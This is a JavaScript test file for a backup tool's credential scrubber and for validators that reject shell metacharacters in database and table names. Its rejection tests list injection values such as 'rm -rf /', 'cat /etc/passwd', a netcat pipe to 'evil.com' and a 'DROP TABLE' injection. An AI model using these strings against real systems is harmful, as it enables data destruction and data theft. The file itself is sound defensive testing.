require('ts-node/register/transpile-only');

const test = require('node:test');
const assert = require('node:assert/strict');
const v = require('valibot');

const {
  sanitizeErrorMessage,
  sanitizeObject,
} = require('../../src/utils/credential-scrubber');
const { DatabaseConfigSchema, BackupOptionsSchema } = require('../../src/validators');

test('sanitizeErrorMessage strips credentials from database connection URIs', () => {
  const postgresUri = 'Connection failed: postgres://dbadmin:SuperSecretPass123!@db.example.com:5432/production';
  const sanitized = sanitizeErrorMessage(postgresUri);
  assert.ok(!sanitized.includes('SuperSecretPass123!'));
  assert.ok(sanitized.includes('postgres://dbadmin:***@db.example.com:5432/production'));

  const mongoUri = 'mongodb://root:SecretPass456@cluster0.mongodb.net:27017/app';
  const sanitizedMongo = sanitizeErrorMessage(mongoUri);
  assert.ok(!sanitizedMongo.includes('SecretPass456'));
  assert.ok(sanitizedMongo.includes('mongodb://root:***@cluster0.mongodb.net:27017/app'));
});

test('sanitizeErrorMessage masks Slack webhooks', () => {
  const message = 'Slack alert failed for https://hooks.slack.com/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX';
  const sanitized = sanitizeErrorMessage(message);
  assert.ok(!sanitized.includes('XXXXXXXXXXXXXXXXXXXXXXXX'));
  assert.ok(sanitized.includes('https://hooks.slack.com/services/***'));
});

test('sanitizeErrorMessage masks password key-value parameters', () => {
  const text = 'pg_dump failed with password=topsecret123 and auth: myTokenVal';
  const sanitized = sanitizeErrorMessage(text);
  assert.ok(!sanitized.includes('topsecret123'));
  assert.ok(!sanitized.includes('myTokenVal'));
  assert.ok(sanitized.includes('password=***'));
  assert.ok(sanitized.includes('auth:***'));
});

test('sanitizeErrorMessage masks 64-hex character encryption keys', () => {
  const key = '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef';
  const text = `Decryption failed using key ${key}`;
  const sanitized = sanitizeErrorMessage(text);
  assert.ok(!sanitized.includes(key));
  assert.ok(sanitized.includes('***[64-hex-key-redacted]***'));
});

test('sanitizeObject deeply redacts sensitive keys in objects', () => {
  const payload = {
    database: 'analytics',
    password: 'super-password',
    storage: {
      secretKey: 'aws-secret-key-value',
      bucket: 'my-bucket',
    },
    nested: [
      { webhookUrl: 'https://hooks.slack.com/services/T1/B2/token' },
      { harmless: 'value' },
    ],
  };

  const sanitized = sanitizeObject(payload);
  assert.equal(sanitized.password, '***');
  assert.equal(sanitized.storage.secretKey, '***');
  assert.equal(sanitized.storage.bucket, 'my-bucket');
  assert.equal(sanitized.nested[0].webhookUrl, '***');
  assert.equal(sanitized.nested[1].harmless, 'value');
});

test('DatabaseConfigSchema rejects shell metacharacters in database names', () => {
  const dangerousNames = [
    'test; rm -rf /',
    'db && cat /etc/passwd',
    'db | nc evil.com 1337',
    'db`whoami`',
    'db$(whoami)',
    'db\nnewline',
    'db\0nullbyte',
  ];

  for (const name of dangerousNames) {
    const res = v.safeParse(DatabaseConfigSchema, {
      type: 'postgresql',
      database: name,
    });
    assert.equal(res.success, false, `Should reject dangerous name: ${name}`);
  }

  // Valid names should pass
  const validNames = ['mydb', 'my_db_2026', 'analytics-production', 'app.db'];
  for (const name of validNames) {
    const res = v.safeParse(DatabaseConfigSchema, {
      type: 'postgresql',
      database: name,
    });
    assert.equal(res.success, true, `Should accept valid name: ${name}`);
  }
});

test('BackupOptionsSchema rejects shell metacharacters in table names', () => {
  const res = v.safeParse(BackupOptionsSchema, {
    tables: ['users', 'orders; DROP TABLE users;'],
  });
  assert.equal(res.success, false);

  const validRes = v.safeParse(BackupOptionsSchema, {
    tables: ['users', 'order_items', 'audit_logs'],
  });
  assert.equal(validRes.success, true);
});
